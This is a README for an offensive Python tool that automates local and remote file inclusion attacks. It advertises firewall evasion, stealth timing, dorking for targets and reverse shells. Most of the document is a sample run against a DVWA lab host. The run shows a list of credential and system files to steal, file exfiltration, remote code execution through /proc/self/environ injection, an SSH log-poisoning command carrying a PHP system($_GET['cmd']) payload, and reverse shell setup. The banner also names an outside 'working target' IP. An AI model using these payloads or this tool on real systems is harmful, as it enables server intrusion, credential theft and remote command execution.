# CrabStick

A small python tool for automatic local and remote file inclusion exploitation.

Usage of CrabSticks for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.

# What can it do? 
+Locate LFI/RFI's 
+Perform heuristic testing on the URL 
+Generate payloads for many types of LFI attacks (PHP Wrapper php://filter, PHP Wrapper php://file, PHP Wrapper expect:// LFI, /proc/self/environ LFI Method, /proc/self/fd/ LFI Method, base64 filter bypass)
+Scrape the server response to identify successfull attack
+Crawl website to find potentialy vulnerable URI's (coming soon)
+Brute force path transversal to find root directory
+Dictionary attack on common sys config locations and important files (SSH logs, /etc/passwd, etc) HAIL MARY 
+Custom OS targeting payloads (windows/linux)
+Custom Dictionaries
+Upload reverse TCP shell and start a listener
+Crawl search enginges (Use for research only, default heuristics testing only)
+Custom cookies and useragents (can be random if selected)
+Basic web application firewall evasion techniques
+Proxy settings
+Error code analysis 
+PHP null byte injection
+SSH log poissioning (priv esc)

## What it cannot do
-Make you coffee
-Make you l33t hax0r

## Tutorial
[![IMAGE ALT TEXT HERE](https://img.youtube.com/vi/ASkUZuimY3Y/0.jpg)](https://www.youtube.com/watch?v=ASkUZuimY3Y)
. 
![alt text](https://i.gyazo.com/1c8ea2caf7d25124f60635654f6eced6.png "Logo Title Text 1")

## Dependencies 

pip install requests

python3 

## Cloning

```
git clone https://github.com/Hack-Hut/CrabStick.git
```

## Running 

```
python3 Crab.py -u http://www.somesite.com/include.php?file=3
```

## Documentation

[HackHut](http://www.hackhut.co.uk/index.php/2017/03/27/comprehensive-guide-to-exploiting-local-and-remote-file-inclusion/) #Down


## Usage
```
Usage: Crab.py [options]

Options:
  -h, --help            show this help message and exit
  -u http://www.somesite.com/index.php?page=, --url=http://www.somesite.com/index.php?page=
                        URL of target
  -F, --filter          Base64 encoder
  -d, --dic             If lfi is found, perform dictionary attack to retrieve
                        files
  -v, --verbose         Display more information
  -i 192.168.0.52, --ip=192.168.0.52
                        Ip address for shell to connect back to
  -p 4444, --port=4444  Port for shell to connect back to
  --dork                Search for pages using search engines
  -c CP=H2; Geolocation=Crabland, --cookie=CP=H2; Geolocation=Crabland
                        Cookie for authentication
  -a, --random-agent    Turns random user agents on
  -f /etc/passwd, --file=/etc/passwd
                        File to be included default is /etc/passwd
  -k root:x, --key=root:x
                        Search key for checking if file is included
  -s, --stealth         Enable random timing to become more stealthy
  --proxy=http://10.45.16.8:80
                        Redirect data through a HTTP proxy
  ```

## What can CrabStick do at the moment? 



## To Do !

1. Dorks 
2. Base64 
3. Beautiful soup 
4. Comment code 
5. Documentation 
6. Pentest monkey reverse php shell

### Author

HackHut

https://www.youtube.com/channel/UC3OAaHAewLkVPu98DL8FR3g

Created as a small project to help me learn


#### Example 

```
root@HackHut:~/Pycharm/CrabStick# python3 Crab.py --cookie="security=low;
PHPSESSID=981bcdda6a93e3a85126345587df7f8f" --url="http://192.168.0.57/dvwa/vulnerabilities/fi/?page=include.php"
-i 192.168.0.48 -p 444444 -d 
         ,__,
    (/__/\oo/\__(/
      _/\/__\/\_
       _/    \_ 
_________              ___.     _________ __   __        __    
\_   ___ \HACK_HUT____ \_ |__  /   _____//  |_|__| ____ |  | __
/    \  \/\_  __ \__  \ | __ \ \_____  \   __\  |/ ___\|  |/ /
\     \____|  | \// __ \| \_\ \/        \|  | |  \  \___|    < 
 \______  /|__|  (______/_____/_________/|__| |__|\_____>__|_ \ 
        \/              A tool for HTTP file inclusion exploits
-----------------------------------------------------------------
Type:    CrabStick.py --help
For help
for --url please type http or https
-----------------------------------------------------------------
working target: http://140.113.1.99/includes/include_once.php?include_file=
-----------------------------------------------------------------
TIP: type %%##%% to place an alternative injection point for payload
Example: --url="https://www.192.86.0.1/index.php?file=%%##%%&ID=1"

-----------------------------------------------------------------
[ ]  [2017-03-20 23:22:23.273105] Getting everything ready
-----------------------------------------------------------------
[-]  [2017-03-20 23:22:23.273153] Does this URL look correct
Y/n

http://http://192.168.0.57/dvwa/vulnerabilities/fi/?page=include.php

[+]  [2017-03-20 23:22:25.603626] 192.168.0.57 looks good defined
[+]  [2017-03-20 23:22:25.603703] Testing connection to 192.168.0.57
[ ]  [2017-03-20 23:22:25.603724] Trying http://192.168.0.57
[+]  [2017-03-20 23:22:25.628204] Received status code:200
[+]  [2017-03-20 23:22:25.628385] Target up
[+]  [2017-03-20 23:22:25.628499] Payload generated
-----------------------------------------------------------------
[+]  [2017-03-20 23:22:25.653434] Prerequisite tests show target might be vulnerable
-----------------------------------------------------------------

-----------------------------------------------------------------
[+]  [2017-03-20 23:22:25.774420] (V)(°,,,,°)(V) WE DID IT
[+]  [2017-03-20 23:22:25.774490] LFI found at http://192.168.0.57/dvwa/vulnerabilities/fi/?page=../../../../../etc/passwd
-----------------------------------------------------------------

[-]  [2017-03-20 23:22:25.774524] Searching in blind mode

LINUX   /etc/issue                          Contains a message or system identification to be printed before the login prompt
LINUX   /proc/version                       Contains linux release version
LINUX   /etc/profile                        Kernel profiling information
LINUX   /etc/passwd                         Juicy user list
LINUX   /etc/shadow                         Password hashes (root)
LINUX   /root/.bash_history                 Root users previous commands (root)
LINUX   /var/log/dmessage                   Ring buffer contents from last successful boot process
LINUX   /var/log/dmesg                      Ring buffer contents from last successful boot process
LINUX   /var/mail/root                      Mail
LINUX   /var/log/auth.log                   SSH authentication log file (can be used for file poisoning to gain RCE)
LINUX   /var/spool/cron/crontabs/root       Root crontab table (root)
LINUX   /etc/php5/cgi/php.ini               PHP info page
LINUX   /etc/group                          User group file
LINUX   /proc/self/environ                  

WIND    %SYSTEMROOT%\repair\system          do the rest luke
WIND    %SYSTEMROOT%\repair\SAM
WIND    %SYSTEMROOT%\repair\SAM
WIND    %WIN:DIR%\win.ini
WIND    %SYSTEMDRIVE%\boot.ini
WIND    %WIN:DIR%\Panther\sysprep.inf

OSX     /etc/fstab                          do the rest luke
OSX     /etc/master.passwd
OSX     /etc/resolv.conf
OSX     /etc/sudoers
OSX     /etc/sysctl.conf
-----------------------------------------------------------------
[ ]  [2017-03-20 23:22:25.774987] What OS is the server

1:Windows
2:Linux
3:OSX
4:Unknown (Too lazy to do an nmap scan)
1/2/3/4  :2

[+]  [2017-03-20 23:22:26.926732] Downloaded file 0/323:/etc/issue
[+]  [2017-03-20 23:22:26.952888] Downloaded file 1/323:/proc/version
[+]  [2017-03-20 23:22:26.977378] Downloaded file 2/323:/etc/profile
[+]  [2017-03-20 23:22:27.002936] Downloaded file 3/323:/etc/passwd
[-]  [2017-03-20 23:22:27.032720] Permission denied:/etc/shadow
[-]  [2017-03-20 23:22:27.053971] Failed :/root/.bash_history
[-]  [2017-03-20 23:22:27.078300] Failed :/var/log/dmessage
[+]  [2017-03-20 23:22:27.102557] Downloaded file 7/323:/var/log/dmesg
[-]  [2017-03-20 23:22:27.125235] Permission denied:/var/mail/root
[+]  [2017-03-20 23:22:27.149234] Downloaded file 9/323:/var/log/auth.log
[-]  [2017-03-20 23:22:27.170566] Permission denied:/var/spool/cron/crontabs/root
[+]  [2017-03-20 23:22:27.192314] Downloaded file 11/323:/etc/php5/cgi/php.ini
[+]  [2017-03-20 23:22:27.216731] Downloaded file 12/323:/etc/group
[+]  [2017-03-20 23:22:27.239031] Downloaded file 13/323:/proc/self/environ
[-]  [2017-03-20 23:22:27.262383] Failed :/var/log/httpd/access_log
[+]  [2017-03-20 23:22:27.287925] Downloaded file 15/323:/proc/self/environ
[+]  [2017-03-20 23:22:27.309286] Downloaded file 16/323:/proc/version
[-]  [2017-03-20 23:22:27.331182] Permission denied:/var/log/apache2/access.log
[-]  [2017-03-20 23:22:27.354408] Failed :/var/log/httpd-access.log
[-]  [2017-03-20 23:22:27.378683] Failed :/usr/localetc/apache22/httpd.conf
[+]  [2017-03-20 23:22:27.400966] Downloaded file 20/323:/etc/apache2/apache2.conf
[-]  [2017-03-20 23:22:27.423490] Failed :/etc/httpd/conf/httpd.conf
[-]  [2017-03-20 23:22:27.445051] Failed :/var/log/mysqld.log
[+]  [2017-03-20 23:22:27.469002] Downloaded file 23/323:/etc/mysql/my.cnf
[-]  [2017-03-20 23:22:27.491058] Permission denied:/var/lib/mysql/mysql/user.MYD
[-]  [2017-03-20 23:22:27.514083] Failed :/etc/inittab
[+]  [2017-03-20 23:22:27.537553] Downloaded file 26/323:/etc/sysctl.conf
[-]  [2017-03-20 23:22:27.560779] Failed :/etc/ts.conf
[-]  [2017-03-20 23:22:27.584459] Failed :/etc/clamav/clamd.conf
[-]  [2017-03-20 23:22:27.608276] Failed :/etc/clamav/freshclam.conf
[-]  [2017-03-20 23:22:27.633095] Failed :/etc/ca-certificates.conf
[+]  [2017-03-20 23:22:27.658239] Downloaded file 31/323:/etc/debconf.conf
[+]  [2017-03-20 23:22:27.679856] Downloaded file 32/323:/etc/bash_completion.d/debconf
[-]  [2017-03-20 23:22:27.702124] Failed :/etc/tor/tor-tsocks.conf
[-]  [2017-03-20 23:22:27.724346] Failed :/etc/xdg/user-dirs.conf
[-]  [2017-03-20 23:22:27.748032] Failed :/etc/htdig/htdig.conf
[-]  [2017-03-20 23:22:27.771591] Failed :/etc/remastersys.conf
[-]  [2017-03-20 23:22:27.793638] Failed :/etc/gnome-vfs-2.0/modules/default-modules.conf
[-]  [2017-03-20 23:22:27.815308] Failed :/etc/gnome-vfs-2.0/modules/extra-modules.conf
[-]  [2017-03-20 23:22:27.837052] Failed :/etc/gconf
[-]  [2017-03-20 23:22:27.858879] Failed :/etc/gconf/gconf.xml.defaults
[+]  [2017-03-20 23:22:27.883504] Downloaded file 41/323:/etc/gconf/gconf.xml.defaults/%gconf-tree.xml
[-]  [2017-03-20 23:22:27.906432] Failed :/etc/gconf/gconf.xml.system
[-]  [2017-03-20 23:22:27.929314] Failed :/etc/gconf/2
[+]  [2017-03-20 23:22:27.956755] Downloaded file 44/323:/etc/gconf/2/evoldap.conf
[+]  [2017-03-20 23:22:27.982327] Downloaded file 45/323:/etc/gconf/2/path
---------------------------------------------------------------------------------------------------------------------------
DOWNLOADING THE OTHER FILES HERE (cut output out as it is unneeded here) 
---------------------------------------------------------------------------------------------------------------------------
[-]  [2017-03-20 23:22:34.455379] Permission denied:/etc/fuse.conf
[-]  [2017-03-20 23:22:34.478777] Failed :/etc/uniconf.conf
[+]  [2017-03-20 23:22:34.499974] Downloaded file 316/323:/etc/syslog.conf
[-]  [2017-03-20 23:22:34.523607] Failed :/etc/cvs-cron.conf
[+]  [2017-03-20 23:22:34.548792] Downloaded file 318/323:/etc/snmp/snmpd.conf
[-]  [2017-03-20 23:22:34.570650] Failed :/share/snmp/snmpd.conf
[-]  [2017-03-20 23:22:34.591930] Failed :/proc/self/fd/
[-]  [2017-03-20 23:22:34.615419] Failed :/proc/self/fd/10
[-]  [2017-03-20 23:22:34.639403] Failed :/proc/self/fd/2
-----------------------------------------------------------------
[+]  [2017-03-20 23:22:34.645454] Trying to escalate attack to remote code execution by injecting php code into user agents and request proc/self/environ
-----------------------------------------------------------------
-----------------------------------------------------------------
[+]  [2017-03-20 23:22:34.669914] (V)(°,,,,°)(V) WE DID IT
[+]  [2017-03-20 23:22:34.670087] Remote code execution found by editing user agents at http://192.168.0.57/dvwa/vulnerabilities/fi/?page=../../../../../proc/self/environ&cmd=
-----------------------------------------------------------------
[+]  [2017-03-20 23:22:34.670143] Creating telnet reverse shell
[+]  [2017-03-20 23:22:34.670181] Remember to start a listener in another shell
Hit enter when listen is created
[ ]  [2017-03-20 23:22:36.904700] Shell created
[ ]  [2017-03-20 23:22:36.974700] Shell closed by user
-----------------------------------------------------------------
[ ]  [2017-03-20 23:22:36.974833] Trying to get the PHPinfo file
-----------------------------------------------------------------
[+]  [2017-03-20 23:22:37.008018] Trying to escalate attack to remote code execution poisoning the ssh auth.log file
-----------------------------------------------------------------
[ ]  [2017-03-20 23:22:37.008094] Just hit ctrl + c when asked for a password
ssh '<pre><?php echo system($_GET['cmd']); exit; ?>'@192.168.0.57
<pre><?php echo system($_GET[c@192.168.0.57's password: 
[+]  [2017-03-20 23:22:38.013344] Remember to start a listener in another shell
Hit enter when listen is created
[ ]  [2017-03-20 23:22:38.907004] Shell created
[ ]  [2017-03-20 23:22:38.927004] Shell closed by user
-----------------------------------------------------------------
-----------------------------------------------------------------
[+]  [2017-03-20 23:22:38.927310] Testing RFI
[-]  [2017-03-20 23:22:38.975675] Target does not seem vulnerable to RFI
-----------------------------------------------------------------
```



